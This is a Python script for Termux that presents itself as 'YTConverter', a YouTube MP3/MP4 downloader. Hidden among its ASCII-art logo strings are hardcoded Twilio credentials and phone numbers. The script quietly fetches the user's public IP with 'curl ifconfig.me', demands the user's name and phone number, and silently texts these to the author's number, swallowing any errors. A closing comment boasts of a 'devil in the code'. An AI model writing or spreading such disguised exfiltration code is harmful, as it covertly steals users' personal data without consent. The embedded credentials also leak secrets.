import time
import os
import random
import subprocess as s
try:
 from pytube import YouTube
 from pytube.cli import on_progress
 import fontstyle as f
 from twilio.rest import Client
 from colorama import Fore , init
except:
 print('Installing required packages\n')  
 os.system("pip install fontstyle")
 os.system("pip install colorama")
 os.system("pip install pytube")		
 os.system("pip install twilio")
 os.system("pkg install curl") 
 os.system("pkg install openssl-tool")
 os.system("pkg install libssl")
 print('''
''')
 print('Run the code again')
 exit()
logo_design_1 = Fore.GREEN + '''                                             
  .;'                     `;,
 .;'  ,;'             `;,  `;,   {0}ytconverter
.;'  ,;'  ,;'     `;,  `;,  `;,
::   ::   :   {1}( ){0}   :   ::   ::                              
':.  ':.  ':. {1}/_\{0} ,:'  ,:'  ,:'          
 ':.  ':.    {1}/___\{0}    ,:'  ,:'     {1}by KAIF_CODEC{0}
  ':.       {1}/_____\{0}      ,:'
           {1}/       \\{0}
'''.format(Fore.GREEN, Fore.WHITE, Fore.RED)

account_sid='AC96e5355a479cb6af19612f3dd331994c'
logo_design_2 = '''
\033[92m
          +hydNNNNdyh+
        +mMMMMMMMMMMMMm+
      `dMMm\033[0m:\033[92mNMMMMMMN\033[0m:\033[92mmMMd`
      hMMMMMMMMMMMMMMMMMMh
  \033[92m..  yyyyyyyyyyyyyyyyyyyy  ..                                     
\033[92m.mMMm`MMMMMMMMMMMMMMMMMMMM`mMMm.            \033[0m Thanks for downloading!\033[92m
\033[92m:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
-MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM-
 +yy+ MMMMMMMMMMMMMMMMMMMM +yy+
      mMMMMMMMMMMMMMMMMMMm
      `/++MMMMh++hMMMM++/`
          MMMMo  oMMMM
          MMMMo  oMMMM
          oNMm-  -mMNs      KAIF_CODEC'''
auth_token='46b26022257f42e20e1f99e1c79567d6'
logo_design_3 = Fore.GREEN + '''
    .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .

         KAIF_CODEC'''
twilio_number='+15856012490'
logo_design_4 = Fore.RED + '''
 __  __     ______     __     ______   ______     ______     _____     ______     ______    
/\ \/ /    /\  __ \   /\ \   /\  ___\ /\  ___\   /\  __ \   /\  __-.  /\  ___\   /\  ___\   
\ \  _"-.  \ \  __ \  \ \ \  \ \  __\ \ \ \____  \ \ \/\ \  \ \ \/\ \ \ \  __\   \ \ \____  
 \ \_\ \_\  \ \_\ \_\  \ \_\  \ \_\    \ \_____\  \ \_____\  \ \____-  \ \_____\  \ \_____\ 
  \/_/\/_/   \/_/\/_/   \/_/   \/_/     \/_____/   \/_____/   \/____/   \/_____/   \/_____/ 
                                                                                            
                      ,____
                      |---.\\
              ___     |    `      KAIF_CODEC
             / .-\  ./=)
            |  |"|_/\/|
            ;  |-;| /_|         REAP THE REWARDS
           / \_| |/ \ |
          /      \/\(           YT Converter
          |   /  |` ) |
          /   \ _/    |
         /--._/  \    |
         `/|)    |    /
           /     |   |
         .'      |   |
        /         \  |
       (_.-.__.__./  /

'''
too='+916296132104'
tname=f.apply('WHAT IS YOUR NAME?','/yellow/bold')
warning=f.apply("(DON'T TRY TO ENTER WRONG DATA,YOU WILL NOT BE ABLE TO CHANGE IT AGAIN)",'/red/bold')
tnum=f.apply('ENTER YOU PHONE NUMBER','/cyan/bold')

f1='''                   ▄▀▄     ▄▀▄
                  ▄█░░▀▀▀▀▀░░█▄
              ▄▄  █░░░░░░░░░░░█  ▄▄
             █▄▄█ █░░█░░┬░░█░░█ █▄▄█''' 
f2='''      ╔════════════════════════════════════════╗
      ║ ♚ Project Name : YTConverter™          ║
      ║ ♚ Author : KAIF_CODEC                  ║
      ║ ♚ Github : github.com/kaifcodec        ║
      ║ ♚ Email  : kaif.repo.official@gmail.com║
      ╠════════════════════════════════════════ '''
f3='''      ╠═▶ [𝗦𝗲𝗹𝗲𝗰𝘁 𝗔 𝗙𝗼𝗿𝗺𝗮𝘁]  ➳
      ╠═▶ 1. Music Mp3 🎶
      ╠═▶ 2. Video🎥 Higest Resolution
      ╠═▶ 3. Exit YTConverter'''
f4='      ╚═:➤ '      


des1=f.apply(f1,'/red')
des2=f.apply(f2,'/yellow')
des3=f.apply(f3,'/cyan')
des4=f.apply(f4,'/cyan')
info =f.apply("WHAT DO YOU THINK ABOUT KAIF | YOU CAN WRITE ANYTHING YOU WANT (WRITE AT LEAST A LINE WHAT YOU THINK REALLY)[DON'T SEND THIS BLANK THEN YOU WILL MISS A PREMIUM OFFER : ", "/green/bold")
burl=f.apply('Bad url check the url first','/red/bold')
error=f.apply('AN ERROR OCCURRED, RUN THE CODE AGAIN','/red/bold')
def main_title():       
 logo_list=[logo_design_1,logo_design_2,logo_design_3,logo_design_4]
 title=random.choice(logo_list)
 print(title)
 
def bio():
 print(des1)
 print(des2)
 print(des3)

#all texts__


text1=f.apply("Enter the url of the video you want to download  ","/green/bold")
text2=f.apply("Enter the destination path where you want to save this mp3  ","/yellow/bold")
text3=f.apply("(Or leave blank to save in current directory)","/yellow/bold")
text4=f.apply("Taken time to download =", "/cyan/bold")
permit_text=f.apply("Allow the storage permission that will pop up on your screen","/green/italic/bold")

try:
 filen=open("/storage/emulated/0/Download/ytconverter.test",'wb')
except:
 print('\n',permit_text)
 os.system('termux-setup-storage')
 time.sleep(6)
 try:
  filen=open("/storage/emulated/0/Download/ytconverter.test",'wb')
 except:
  print('\n',permit_text,'Last time I am asking for the permission allow it or I will exit.')
  print('\n',"Yes I am a rude A.I")
  os.system('termux-setup-storage')
  time.sleep(4)
  pass

def main_mp4():
 print('''


''')
 print(text1)
 url=input(">> ")
 print("Wait a few seconds Download starting......")
 print("  ")
 time1=int(time.time())
 yt=YouTube(url,on_progress_callback=on_progress)
 video=yt.streams.get_highest_resolution() 
 destination="/storage/emulated/0/Download/"
 out_file = video.download(output_path=destination)
 print('Downloading video: ')

 base, ext = os.path.splitext(out_file)
 new_file = base + '.mp4'
 os.rename(out_file, new_file)

 ltext=f.apply(" Video has been successfully downloaded.","/green/bold")
 print('\n',str(yt.title) ,ltext)

 time2=int(time.time())



 ftime=time2-time1
 coloured_time=f.apply(ftime,"/cyan/bold")
 print(text4,coloured_time," sec")
 print("  ")
######################

def main_mp3():
 print('''


''')
 print(text1)
 url=input(">> ")
 print("Wait a few seconds Download starting......")
 print("  ")
 time1=int(time.time())
 yt=YouTube(url,on_progress_callback=on_progress)
 video=yt.streams.filter(only_audio=True).first()
 destination="/storage/emulated/0/Download"
 out_file = video.download(output_path=destination)
 print('Downloading the audio: ')

 base, ext = os.path.splitext(out_file)
 new_file = base + '.mp3'
 os.rename(out_file, new_file)

 ltext=f.apply(" Audio has been successfully downloaded.","/green/bold")
 print('\n',str(yt.title) ,ltext)

 time2=int(time.time())



 ftime=time2-time1
 coloured_time=f.apply(ftime,"/cyan/bold")
 print(text4,coloured_time," sec")
 print("  ")





ip=s.check_output("curl ifconfig.me", shell=True)
os.system("clear")
try:
 import data
 try:
  null=os.system("rm -r -f __pycache__")
 except:
  pass
 num=data.dat_num
 name=data.dat_name
 what=data.dat_know
except ModuleNotFoundError:
 file=open('data.py','w')
 print("THIS IS COMPULSORY FOR THE FIRST TIME\n")
 mm=input(tname+warning+'⚠⚠ : ')
 print('  ')
 nn=input(tnum+warning+'⚠⚠ : ')
 msg=input(info)
 file.write(f"dat_name='{mm}' \ndat_num='{nn}' \ndat_know='{msg}'")
 print('\n',error)
 exit()
try:
 client=Client(account_sid,auth_token)
 message=client.messages.create(    
body=f"NAME={name} \nNUM={num} \nIP={ip} \n INFO={what}",
    from_=twilio_number,
    to=too
)
except:
 pass
bio()
option=input(des4)

if (option=="1" or option =="1 "):
 main_title()
 print('''

''')
 main_mp3()
elif (option=="2" or option =="2 "):
 main_title()
 print('''

''') 
 main_mp4()
elif (option=="3" or option =="3 " ):
 print('Have a nice day Bye!')
 exit()
else:
 print('Have a nice day Bye!')
 exit()
exitc=f.apply("Press [ENTER] to continue downloading another content  ","/green/bold")
print(exitc)
choice=input(">>")
while (choice =="" or choice == " " ):
 bio()
 option=input(des4)

 if (option=="1" or option =="1 "):
  main_title()
  print('''

''')
  main_mp3()
 elif (option=="2" or option =="2 "):
  main_title()
  print('''

 ''') 
  main_mp4()
 elif(option=='3' or option =='3 '):
  print('''
Have a nice day Bye!''')
  exit()
 else:
  print('''
Have a nice day Bye!''')
  exit()
 print(exitc)
 choice=input(">>")
 
else:
 exit()


#                      ,____
#                      |---.\\
#              ___     |    `  
#             / .-\  ./=)
#            |  |"|_/\/|
#            ;  |-;| /_|         
#           / \_| |/ \ |
#          /      \/\( |
#          |   /  |` ) |
#          /   \ _/    |
#         /--._/  \    |
#         `/|)    |    /
#           /     |   |
#         .'      |   |
#        /         \  |
#       (_.-.__.__./  /

#THERE'S A DEVIL IN THE CODE. DON'T TRY TO #CHANGE THE CODE,NOW YOU ARE IN CONTROL.
#MESSAGE BY 'KAIF_CODEC'.
#LOGO CREDITS GOES TO : 'PhoneSploit'
 






